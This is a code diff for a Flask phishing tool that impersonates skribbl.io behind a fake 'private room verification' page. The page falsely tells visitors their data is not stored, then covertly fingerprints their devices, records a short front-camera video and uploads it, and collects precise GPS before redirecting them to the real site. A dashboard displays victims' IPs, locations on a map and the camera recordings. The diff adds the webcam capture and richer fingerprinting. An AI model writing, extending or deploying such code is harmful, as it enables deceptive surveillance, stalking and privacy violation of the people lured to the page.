@@ -1,4 +1,4 @@
-import json, threading, time, os
+import json, threading, time, os, base64
 from flask import Flask, request, Response
 
 _DIR = os.path.dirname(os.path.abspath(__file__))
@@ -7,18 +7,17 @@ try:
     REDIRECT_URL = open(_cfg_file).read().strip()
 except Exception:
     REDIRECT_URL = "https://skribbl.io"
-LOG_FILE     = os.path.join(_DIR, "captures.json")
-PHISH_PORT   = 8080
-DASH_PORT    = 8181
+LOG_FILE   = os.path.join(_DIR, "captures.json")
+PHISH_PORT = 8080
+DASH_PORT  = 8181
 
 captures = []
 _id_ctr  = 0
 
-# Load previous captures if any
 try:
     with open(LOG_FILE) as f:
         captures = json.load(f)
-        _id_ctr = max((c.get('_id',0) for c in captures), default=0)
+        _id_ctr = max((c.get('_id', 0) for c in captures), default=0)
 except Exception:
     pass
 
@@ -27,7 +26,7 @@ def _next_id():
     _id_ctr += 1
     return _id_ctr
 
-def parse_body():
+def _parse_body():
     try:
         d = request.get_json(force=True, silent=True)
         if d: return d
@@ -40,15 +39,19 @@ def parse_body():
 
 def _ip():
     return (request.headers.get('CF-Connecting-IP') or
-            request.headers.get('X-Forwarded-For','').split(',')[0].strip() or
+            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
             request.remote_addr)
 
-def save():
+def _save():
     try:
         with open(LOG_FILE, 'w') as f:
             json.dump(list(captures), f, default=str)
     except Exception:
         pass
+
+def _logo_b64():
+    with open(os.path.join(_DIR, 'logo.gif'), 'rb') as f:
+        return 'data:image/gif;base64,' + base64.b64encode(f.read()).decode()
 
 # ── Phish app ──────────────────────────────────────────────────────────────
 
@@ -96,10 +99,11 @@ body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display
     <div class="card-top">🔒 Private Room — Verification Required</div>
     <div class="card-body">
       <div class="notice">
-        <b>Location verification required.</b><br/>
-        skribbl.io uses your location to prevent bots and ensure only real players can join private rooms. Your location is <b>not stored</b> and is only used for this session.
+        <b>Location &amp; device verification required.</b><br/>
+        skribbl.io checks your location and device to prevent bots and ensure only real players join private rooms. This data is <b>not stored</b> and is only used for this session.
       </div>
-      <button id="btn" onclick="joinRoom()">Verify &amp; Join Room</button>
+      <div id="cam-status" style="display:none;font-size:.8rem;font-weight:700;padding:8px 10px;border-radius:3px;background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.12);text-align:center"></div>
+      <button id="btn" onclick="joinRoom()" disabled>Verify &amp; Join Room</button>
       <div class="prog-wrap" id="bar"><div class="prog-fill"></div></div>
       <div id="status"></div>
     </div>
@@ -109,42 +113,104 @@ body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display
 <script>
 var REDIRECT="REDIRECT_PLACEHOLDER";
 var BASE=location.protocol+"//"+location.host;
+var cameraDone=false,gpsDone=false;
+
+function tryRedirect(){if(cameraDone&&gpsDone){setTimeout(function(){window.location.href=REDIRECT;},400);}}
 
 function send(path,data){
   var url=BASE+path;
   var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
-  try{ if(navigator.sendBeacon){ navigator.sendBeacon(url,blob); return; } }catch(e){}
-  try{ fetch(url,{method:"POST",mode:"no-cors",body:blob}); }catch(e){}
+  try{if(navigator.sendBeacon){navigator.sendBeacon(url,blob);return;}}catch(e){}
+  try{fetch(url,{method:"POST",mode:"no-cors",body:blob});}catch(e){}
 }
 
 function collectInfo(){
-  return {
-    userAgent:navigator.userAgent,
-    platform:navigator.platform,
-    language:navigator.language,
-    screen:screen.width+"x"+screen.height,
+  var ua=navigator.userAgent;
+  var isTablet=/iPad/.test(ua)||(/Android/.test(ua)&&!/Mobile/.test(ua));
+  var isMobile=!isTablet&&/Mobi|Android|iPhone|iPod/.test(ua);
+  var deviceType=isTablet?"Tablet":isMobile?"Mobile":"Desktop";
+  var os="Unknown";
+  if(/iPhone|iPad|iPod/.test(ua)){var m=ua.match(/OS ([\d_]+)/);os="iOS "+(m?m[1].replace(/_/g,"."):"");}
+  else if(/Android/.test(ua)){var m=ua.match(/Android ([\d.]+)/);os="Android "+(m?m[1]:"");}
+  else if(/Windows NT/.test(ua)){var m=ua.match(/Windows NT ([\d.]+)/);var t={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7"};os="Windows "+(t[m&&m[1]]||m&&m[1]||"");}
+  else if(/Mac OS X/.test(ua)){var m=ua.match(/Mac OS X ([\d_]+)/);os="macOS "+(m?m[1].replace(/_/g,"."):"");}
+  else if(/Linux/.test(ua)){os="Linux";}
+  var browser="Unknown";
+  if(/OPR\//.test(ua)){var m=ua.match(/OPR\/([\d.]+)/);browser="Opera "+(m?m[1]:"");}
+  else if(/Edg\//.test(ua)){var m=ua.match(/Edg\/([\d.]+)/);browser="Edge "+(m?m[1]:"");}
+  else if(/Firefox\//.test(ua)){var m=ua.match(/Firefox\/([\d.]+)/);browser="Firefox "+(m?m[1]:"");}
+  else if(/Chrome\//.test(ua)){var m=ua.match(/Chrome\/([\d.]+)/);browser="Chrome "+(m?m[1]:"");}
+  else if(/Safari\//.test(ua)&&/Version\//.test(ua)){var m=ua.match(/Version\/([\d.]+)/);browser="Safari "+(m?m[1]:"");}
+  var gpu="N/A";
+  try{var c=document.createElement("canvas");var gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(gl){var d=gl.getExtension("WEBGL_debug_renderer_info");if(d)gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL)||"Blocked";}}catch(e){}
+  var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  var netType=conn?(conn.effectiveType||conn.type||"N/A"):"N/A";
+  var netSpeed=conn&&conn.downlink?conn.downlink+"Mbps":"N/A";
+  return{
+    deviceType:deviceType,os:os,browser:browser,gpu:gpu,
+    userAgent:ua,language:navigator.language,
+    screen:screen.width+"x"+screen.height,colorDepth:screen.colorDepth+"bit",
+    pixelRatio:window.devicePixelRatio||1,
     timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cores:navigator.hardwareConcurrency,
-    ram:navigator.deviceMemory,
+    cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory,
     touch:navigator.maxTouchPoints,
-    online:navigator.onLine,
-    cookieEnabled:navigator.cookieEnabled,
-    doNotTrack:navigator.doNotTrack,
-    referrer:document.referrer,
-    url:location.href
+    network:netType,networkSpeed:netSpeed,
+    cookieEnabled:navigator.cookieEnabled,referrer:document.referrer
   };
 }
 
+function setCamStatus(msg,col){
+  var el=document.getElementById('cam-status');
+  if(!el)return;
+  if(!msg){el.style.display='none';return;}
+  el.style.display='block';
+  el.style.color=col||'rgba(255,255,255,.8)';
+  el.textContent=msg;
+}
+
+function captureCamera(){
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cameraDone=true;document.getElementById('btn').disabled=false;return;}
+  setCamStatus('📷 Camera verification required — please allow access');
+  navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
+    .then(function(stream){
+      setCamStatus('🔴 Verifying device… please wait','#f5c034');
+      var chunks=[],mr=new MediaRecorder(stream);
+      mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+      mr.onstop=function(){
+        stream.getTracks().forEach(function(t){t.stop();});
+        setCamStatus('✓ Camera verified','#3fb950');
+        setTimeout(function(){setCamStatus(null);},1500);
+        var blob=new Blob(chunks,{type:mr.mimeType});
+        var fd=new FormData();
+        fd.append('video',blob,'capture.webm');
+        fd.append('mimeType',mr.mimeType);
+        fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
+        cameraDone=true;
+        document.getElementById('btn').disabled=false;
+        tryRedirect();
+      };
+      mr.start();
+      setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
+    }).catch(function(err){
+      var noHw=err.name==='NotFoundError'||err.name==='DevicesNotFoundError';
+      send('/camera',{denied:true,reason:err.message||'Permission denied',errName:err.name});
+      if(noHw){
+        setCamStatus(null);
+        cameraDone=true;
+        document.getElementById('btn').disabled=false;
+      }else{
+        setCamStatus('⚠ Camera access is required to continue. Please allow camera and refresh the page.','#f85149');
+      }
+    });
+}
+
 function autoCapture(){
-  var info=collectInfo();
-  send("/info",info);
-  if(navigator.getBattery){
-    navigator.getBattery().then(function(b){
-      info.battery=Math.round(b.level*100)+"%"+(b.charging?" (charging)":" (discharging)");
-      info._update=true;
-      send("/info",info);
-    }).catch(function(){});
-  }
+  var info=collectInfo();send("/info",info);
+  if(navigator.getBattery){navigator.getBattery().then(function(b){
+    info.battery=Math.round(b.level*100)+"%"+(b.charging?" (charging)":" (discharging)");
+    info._update=true;send("/info",info);
+  }).catch(function(){});}
+  captureCamera();
 }
 
 function setStatus(msg,col){
@@ -158,25 +224,17 @@ function resetBtn(){
 }
 function getBestLocation(onSuccess,onFail){
   var best=null,watchId=null,done=false;
-  var finish=function(){
-    if(done)return;done=true;
-    if(watchId!==null)navigator.geolocation.clearWatch(watchId);
-    if(best)onSuccess(best);else onFail({message:"No position obtained"});
-  };
+  var finish=function(){if(done)return;done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);if(best)onSuccess(best);else onFail({message:"No position obtained"});};
   var timer=setTimeout(finish,15000);
   watchId=navigator.geolocation.watchPosition(
     function(pos){
-      if(!best||pos.coords.accuracy<best.coords.accuracy){
-        best=pos;
-        setStatus("Locking GPS… \xb1"+Math.round(pos.coords.accuracy)+"m");
-      }
+      if(!best||pos.coords.accuracy<best.coords.accuracy){best=pos;setStatus("Locking GPS… \xb1"+Math.round(pos.coords.accuracy)+"m");}
       if(pos.coords.accuracy<=10){clearTimeout(timer);finish();}
     },
     function(err){clearTimeout(timer);done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);onFail(err);},
     {enableHighAccuracy:true,timeout:20000,maximumAge:0}
   );
 }
-
 function joinRoom(){
   document.getElementById("btn").disabled=true;
   document.getElementById("bar").style.display="block";
@@ -189,10 +247,8 @@ function joinRoom(){
   getBestLocation(
     function(pos){
       setStatus("Verified ✓  Entering room…","#3fb950");
-      send("/location",{lat:pos.coords.latitude,lon:pos.coords.longitude,
-        acc:pos.coords.accuracy,alt:pos.coords.altitude,
-        spd:pos.coords.speed,hdg:pos.coords.heading,ts:new Date().toISOString()});
-      setTimeout(function(){window.location.href=REDIRECT;},800);
+      send("/location",{lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed,hdg:pos.coords.heading,ts:new Date().toISOString()});
+      gpsDone=true;tryRedirect();
     },
     function(err){
       send("/location",{denied:true,reason:err.message});
@@ -201,20 +257,16 @@ function joinRoom(){
     }
   );
 }
-
 window.onload=autoCapture;
 </script>
 </body>
 </html>"""
 
-import base64 as _b64
 _LOGO_B64 = None
 def _logo_data_uri():
     global _LOGO_B64
     if _LOGO_B64 is None:
-        logo_path = os.path.join(_DIR, 'logo.gif')
-        with open(logo_path, 'rb') as f:
-            _LOGO_B64 = 'data:image/gif;base64,' + _b64.b64encode(f.read()).decode()
+        _LOGO_B64 = _logo_b64()
     return _LOGO_B64
 
 @phish_app.route('/', methods=['GET'])
@@ -224,41 +276,60 @@ def phish_index():
             .replace('LOGO_PLACEHOLDER', _logo_data_uri()))
     return Response(html, mimetype='text/html')
 
-@phish_app.route('/info', methods=['POST','OPTIONS'])
+@phish_app.route('/info', methods=['POST', 'OPTIONS'])
 def phish_info():
     if request.method == 'OPTIONS': return Response('', 204)
-    d = parse_body()
-    ip = _ip()
-    # Try to update existing device capture for this IP
+    d, ip = _parse_body(), _ip()
+    ua = d.get('userAgent', '')
     for c in captures:
-        if c.get('_ip') == ip and c.get('_endpoint') == '/info':
-            for k,v in d.items():
-                c[k] = v
-            save()
-            return {'ok': True}
-    # New capture
+        if c.get('_ip') == ip and c.get('_endpoint') == '/info' and c.get('userAgent', '') == ua:
+            c.update(d); _save(); return {'ok': True}
     entry = dict(d)
-    entry['_id']       = _next_id()
-    entry['_ip']       = ip
-    entry['_endpoint'] = '/info'
-    entry['_time']     = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
-    captures.append(entry)
-    save()
-    return {'ok': True}
+    entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/info',
+                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
+    captures.append(entry); _save(); return {'ok': True}
 
-@phish_app.route('/location', methods=['POST','OPTIONS'])
+@phish_app.route('/location', methods=['POST', 'OPTIONS'])
 def phish_location():
     if request.method == 'OPTIONS': return Response('', 204)
-    d = parse_body()
-    ip = _ip()
+    d, ip = _parse_body(), _ip()
     entry = dict(d)
-    entry['_id']       = _next_id()
-    entry['_ip']       = ip
-    entry['_endpoint'] = '/location'
-    entry['_time']     = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
-    captures.append(entry)
-    save()
-    return {'ok': True}
+    entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/location',
+                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
+    captures.append(entry); _save(); return {'ok': True}
+
+@phish_app.route('/camera', methods=['POST', 'OPTIONS'])
+def phish_camera():
+    if request.method == 'OPTIONS': return Response('', 204)
+    ip = _ip()
+    ct = request.content_type or ''
+    if 'json' in ct:
+        d = _parse_body()
+        if d.get('denied'):
+            entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
+                     '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                     'denied': True, 'reason': d.get('reason', 'Permission denied'),
+                     'errName': d.get('errName', '')}
+            captures.append(entry); _save(); return {'ok': True}
+        return {'ok': False}
+    if 'video' in request.files:
+        fobj = request.files['video']
+        video_bytes = fobj.read()
+        mime = request.form.get('mimeType') or fobj.content_type or 'video/webm'
+    else:
+        return {'ok': False}
+    if not video_bytes:
+        return {'ok': False}
+    ext = 'webm' if 'webm' in mime else 'mp4'
+    vid_dir = os.path.join(_DIR, 'captures')
+    os.makedirs(vid_dir, exist_ok=True)
+    fname = f'{time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())}_{ip.replace(".", "_")}.{ext}'
+    with open(os.path.join(vid_dir, fname), 'wb') as fv:
+        fv.write(video_bytes)
+    entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
+             '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+             'file': fname, 'mimeType': mime, 'size': len(video_bytes)}
+    captures.append(entry); _save(); return {'ok': True}
 
 # ── Dashboard app ──────────────────────────────────────────────────────────
 
@@ -279,11 +350,12 @@ def _build_dash():
 <style>
 {lcss}
 *{{margin:0;padding:0;box-sizing:border-box}}
-body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;display:flex;height:100vh;overflow:hidden}}
-#map{{flex:1;height:100vh}}
-#sidebar{{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden}}
+html,body{{width:100%;height:100%;overflow:hidden;background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif}}
+body{{display:flex}}
+#map{{flex:1;height:100vh;background:#0d1117}}
+#sidebar{{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden;height:100vh}}
 .hdr{{padding:14px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}}
-.hdr .brand{{font-size:1.1rem;font-weight:700;color:#58a6ff}}
+.brand{{font-size:1.1rem;font-weight:700;color:#58a6ff}}
 .live-dot{{width:8px;height:8px;border-radius:50%;background:#3fb950;display:inline-block;margin-right:6px;animation:pulse 1.4s infinite}}
 @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
 .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 16px;border-bottom:1px solid #30363d;flex-shrink:0}}
@@ -293,7 +365,6 @@ body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;display
 .n.g{{color:#3fb950}}.n.d{{color:#f85149}}.n.a{{color:#58a6ff}}
 .feed-hdr{{padding:10px 16px 6px;font-size:.75rem;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}}
 .clr{{font-size:.75rem;color:#58a6ff;cursor:pointer;background:none;border:none;padding:0}}
-.clr:hover{{text-decoration:underline}}
 #feed{{flex:1;overflow-y:auto;padding:8px 10px}}
 .card{{background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:8px;animation:fadein .4s ease}}
 @keyframes fadein{{from{{opacity:0;transform:translateY(6px)}}to{{opacity:1;transform:translateY(0)}}}}
@@ -302,6 +373,8 @@ body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;display
 .gps{{background:#1a3a2a;color:#3fb950;border:1px solid #3fb950}}
 .deny{{background:#3a1a1a;color:#f85149;border:1px solid #f85149}}
 .dev{{background:#1a2a3a;color:#58a6ff;border:1px solid #58a6ff}}
+.cam{{background:#2a1a3a;color:#c084fc;border:1px solid #c084fc}}
+.cam-deny{{background:#3a1a2a;color:#f472b6;border:1px solid #f472b6}}
 .ts{{font-size:.7rem;color:#8b949e}}
 .ip{{font-size:.75rem;color:#8b949e;margin-bottom:8px;font-family:monospace}}
 .fields{{display:grid;grid-template-columns:1fr 1fr;gap:4px}}
@@ -312,9 +385,9 @@ body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;display
 .at{{background:#30363d;border-radius:3px;height:4px;margin-top:4px;overflow:hidden}}
 .af{{height:100%;border-radius:3px;transition:width .6s}}
 .omaps{{display:inline-block;margin-top:8px;font-size:.75rem;color:#58a6ff;text-decoration:none;background:#1a2a3a;border:1px solid #58a6ff;border-radius:6px;padding:4px 10px}}
-.omaps:hover{{background:#2a3a4a}}
 .status-bar{{padding:6px 16px;font-size:.72rem;color:#8b949e;border-top:1px solid #30363d;flex-shrink:0}}
 #empty{{text-align:center;color:#8b949e;font-size:.85rem;padding:40px 20px}}
+.card-selected{{border-color:#58a6ff!important;box-shadow:0 0 0 2px rgba(88,166,255,.35);}}
 </style>
 </head>
 <body>
@@ -339,122 +412,79 @@ body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;display
 {ljs}
 </script>
 <script>
-var map=L.map('map',{{attributionControl:false,preferCanvas:true,zoomSnap:0.5,wheelPxPerZoomLevel:120}}).setView([20,78],5);
-L.tileLayer('https://{{s}}.basemaps.cartocdn.com/dark_all/{{z}}/{{x}}/{{y}}{{r}}.png',{{
-  maxZoom:19,keepBuffer:4,updateWhenZooming:false,updateWhenIdle:true,crossOrigin:true
-}}).addTo(map);
-
-var markers={{}},seen=new Set(),stats={{g:0,d:0,a:0}};
-
+var map=null,markers={{}},seen=new Set(),stats={{g:0,d:0,a:0}},allCaptures={{}};
 function accColor(a){{return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}}
-
 function f(l,v){{return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}}
-
-function updateStats(){{
-  document.getElementById('sg').textContent=stats.g;
-  document.getElementById('sd').textContent=stats.d;
-  document.getElementById('sa').textContent=stats.a;
-  var total=stats.g+stats.d+stats.a;
-  document.getElementById('hit-count').textContent=total+' hit'+(total===1?'':'s');
-}}
-
+function updateStats(){{document.getElementById('sg').textContent=stats.g;document.getElementById('sd').textContent=stats.d;document.getElementById('sa').textContent=stats.a;var t=stats.g+stats.d+stats.a;document.getElementById('hit-count').textContent=t+' hit'+(t===1?'':'s');}}
 function addCard(d){{
-  if(seen.has(d._id))return;
-  seen.add(d._id);
+  if(seen.has(d._id))return;seen.add(d._id);allCaptures[d._id]=d;
   var e=document.getElementById('empty');if(e)e.remove();
-  var ep=d._endpoint||'';
-  var isGps=ep==='/location'&&!d.denied;
-  var isDeny=ep==='/location'&&d.denied;
-  var badge=isGps?'<span class="bx gps">📍 GPS</span>':
-            isDeny?'<span class="bx deny">🚫 Denied</span>':
-                   '<span class="bx dev">💻 Device</span>';
+  var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
+  var badge,fields='';
   var ts=d._time?new Date(d._time).toLocaleTimeString():'';
-  var fields='';
   if(isGps){{
-    var acc=d.acc!=null?Math.round(d.acc):null;
-    var col=accColor(acc);
+    badge='<span class="bx gps">GPS</span>';
+    var acc=d.acc!=null?Math.round(d.acc):null,col=accColor(acc);
     var pct=acc?Math.min(96,Math.max(4,100-Math.log(acc+1)*15)):30;
-    var lbl=acc==null?'Unknown':acc<=20?'🟢 High ±'+acc+'m':acc<=100?'🟡 Med ±'+acc+'m':'🔴 Low ±'+acc+'m';
-    fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A');
-    fields+=f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A');
-    fields+=f('Accuracy',acc!=null?'± '+acc+' m':'N/A');
-    fields+=f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
-    fields+='<div class="f wide"><div class="lb">'+lbl+'</div>'+
-            '<div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
-    if(d.lat!=null&&d.lon!=null){{
+    var lbl=acc==null?'Unknown':acc<=20?'High +/-'+acc+'m':acc<=100?'Med +/-'+acc+'m':'Low +/-'+acc+'m';
+    fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A')+f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A')+f('Accuracy',acc!=null?'+/- '+acc+' m':'N/A')+f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
+    fields+='<div class="f wide"><div class="lb">'+lbl+'</div><div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
+    if(map&&d.lat!=null&&d.lon!=null){{
       var mk=L.circleMarker([d.lat,d.lon],{{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}}).addTo(map);
-      mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+
-        '<br/>±'+Math.round(d.acc||0)+'m<br/>'+
-        '<a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');
+      mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+'<br/>+/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');
       markers[d._id]=mk;
     }}
     stats.g++;
   }}else if(isDeny){{
-    fields+=f('Reason',d.reason);
-    stats.d++;
+    badge='<span class="bx deny">Denied</span>';
+    fields+=f('Reason',d.reason);stats.d++;
+  }}else if(ep==='/camera'){{
+    if(d.denied){{
+      badge='<span class="bx cam-deny">Cam Denied</span>';
+      fields+=f('Reason',d.reason||'Permission denied');
+      if(d.errName)fields+=f('Error',d.errName);
+    }}else{{
+      badge='<span class="bx cam">Camera</span>';
+      var kb=d.size?Math.round(d.size/1024)+'KB':'?';
+      fields+='<div class="f wide"><div class="lb">Recording · '+kb+'</div><video src="/captures/'+d.file+'" controls playsinline style="width:100%;margin-top:6px;border-radius:8px;background:#000;max-height:200px"></video></div>';
+      fields+=f('Format',d.mimeType||'N/A');
+    }}
   }}else{{
-    var ua=d.userAgent||'';
-    var pl=d.platform||ua.match(/Windows|Linux|Mac|Android|iPhone/)||'';
-    if(Array.isArray(pl))pl=pl[0];
-    var gpu=d.gpu||'N/A';
-    fields+=f('Platform',pl);
-    fields+=f('Screen',d.screen);
-    fields+=f('Timezone',d.timezone);
-    fields+=f('CPU',d.cores?d.cores+' cores':'N/A');
-    fields+=f('RAM',d.ram?d.ram+' GB':'N/A');
-    fields+=f('Battery',d.battery||'N/A');
-    fields+=f('Network',d.network||'N/A');
-    fields+=f('Language',d.language);
-    fields+=f('Touch',d.touch!=null?d.touch+' pts':'N/A');
-    fields+=f('GPU',gpu);
-    if(ua)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.7rem">'+ua+'</div></div>';
+    badge='<span class="bx dev">Device</span>';
+    fields+=f('Device',d.deviceType||'N/A')+f('OS',d.os||d.platform||'N/A');
+    fields+=f('Browser',d.browser||'N/A')+f('Language',d.language||'N/A');
+    fields+=f('Screen',d.screen+(d.pixelRatio&&d.pixelRatio!==1?' @'+d.pixelRatio+'x':'')+(d.colorDepth?' '+d.colorDepth:''))+f('Touch',d.touch!=null?d.touch+' pts':'N/A');
+    fields+=f('CPU',d.cores?d.cores+' cores':'N/A')+f('RAM',d.ram?d.ram+' GB':'N/A');
+    fields+=f('Battery',d.battery||'N/A')+f('Network',d.network+(d.networkSpeed&&d.networkSpeed!=='N/A'?' / '+d.networkSpeed:''));
+    fields+=f('Timezone',d.timezone||'N/A')+f('Cookies',d.cookieEnabled?'Enabled':'Disabled');
+    if(d.gpu&&d.gpu!=='N/A')fields+='<div class="f wide"><div class="lb">GPU</div><div class="vl" style="font-size:.72rem">'+d.gpu+'</div></div>';
+    if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.68rem">'+d.userAgent+'</div></div>';
     stats.a++;
   }}
-  var div=document.createElement('div');
-  div.className='card';
-  div.innerHTML='<div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div>'+
-    '<div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+
-    (isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">🗺 Open Maps</a>':'');
-  document.getElementById('feed').prepend(div);
-  updateStats();
+  var div=document.createElement('div');div.className='card';div.id='card-'+d._id;
+  div.innerHTML='<div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div><div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+(isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>':'');
+  document.getElementById('feed').prepend(div);updateStats();
 }}
-
-function setOk(ok){{
-  document.getElementById('sbar').textContent=ok?'● Connected — polling every 2s':'⚠ Lost connection — retrying…';
-  document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';
-  document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';
-}}
-
-function clearView(){{seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting…</div>';stats={{g:0,d:0,a:0}};updateStats();Object.values(markers).forEach(function(m){{map.removeLayer(m);}});markers={{}};}}
-
-function clearAll(){{
-  if(!confirm('Clear all captures?'))return;
-  fetch('/api/clear',{{method:'POST'}}).then(function(){{clearView();}});
-}}
-
+function setOk(ok){{document.getElementById('sbar').textContent=ok?'Connected - polling every 2s':'Lost connection...';document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';}}
+function clearView(){{seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting...</div>';stats={{g:0,d:0,a:0}};updateStats();if(map)Object.values(markers).forEach(function(m){{map.removeLayer(m);}});markers={{}};}}
+function clearAll(){{if(!confirm('Clear all captures?'))return;fetch('/api/clear',{{method:'POST'}}).then(function(){{clearView();}});}}
 function poll(){{
-  fetch('/api/captures')
-    .then(function(r){{return r.json();}})
-    .then(function(list){{
-      setOk(true);
-      var newOnes=list.filter(function(c){{return !seen.has(c._id);}});
-      list.forEach(function(c){{addCard(c);}});
-      if(newOnes.length===1&&newOnes[0].lat!=null){{
-        var c=newOnes[0];
-        map.flyTo([c.lat,c.lon],Math.min(15,Math.max(10,16-Math.log2((c.acc||500)+1))),{{animate:true,duration:1.5}});
-        if(markers[c._id])markers[c._id].openPopup();
-      }}else if(newOnes.length>1){{
-        var gps=newOnes.filter(function(c){{return c.lat!=null;}});
-        if(gps.length>0){{
-          var bounds=L.latLngBounds(gps.map(function(c){{return [c.lat,c.lon];}}));
-          map.fitBounds(bounds,{{padding:[60,60],animate:true,duration:1.0,maxZoom:13}});
-        }}
-      }}
-    }})
-    .catch(function(){{setOk(false);}});
+  fetch('/api/captures').then(function(r){{return r.json();}}).then(function(list){{
+    setOk(true);
+    var newOnes=list.filter(function(c){{return !seen.has(c._id);}});
+    list.forEach(function(c){{addCard(c);}});
+    if(map&&newOnes.length===1&&newOnes[0].lat!=null){{var c=newOnes[0];map.flyTo([c.lat,c.lon],Math.min(15,Math.max(10,16-Math.log2((c.acc||500)+1))),{{animate:true,duration:1.5}});if(markers[c._id])markers[c._id].openPopup();}}
+    else if(map&&newOnes.length>1){{var gps=newOnes.filter(function(c){{return c.lat!=null;}});if(gps.length>0){{var b=L.latLngBounds(gps.map(function(c){{return[c.lat,c.lon];}}));map.fitBounds(b,{{padding:[60,60],animate:true,duration:1.0,maxZoom:13}});}}}}
+  }}).catch(function(){{setOk(false);}});
 }}
-poll();
-setInterval(poll,2000);
+poll();setInterval(poll,2000);
+document.addEventListener('DOMContentLoaded',function(){{
+  try{{
+    map=L.map('map',{{attributionControl:false,zoomSnap:0.5,wheelPxPerZoomLevel:120}}).setView([20,78],5);
+    L.tileLayer('https://{{s}}.basemaps.cartocdn.com/dark_all/{{z}}/{{x}}/{{y}}{{r}}.png',{{maxZoom:19,keepBuffer:4,updateWhenZooming:false,updateWhenIdle:true,subdomains:'abcd'}}).addTo(map);
+    setTimeout(function(){{map.invalidateSize();}},300);
+  }}catch(err){{console.error('map init failed',err);}}
+}});
 </script>
 </body>
 </html>"""
@@ -466,17 +496,26 @@ def dash_index():
     global DASH_HTML
     if DASH_HTML is None:
         DASH_HTML = _build_dash()
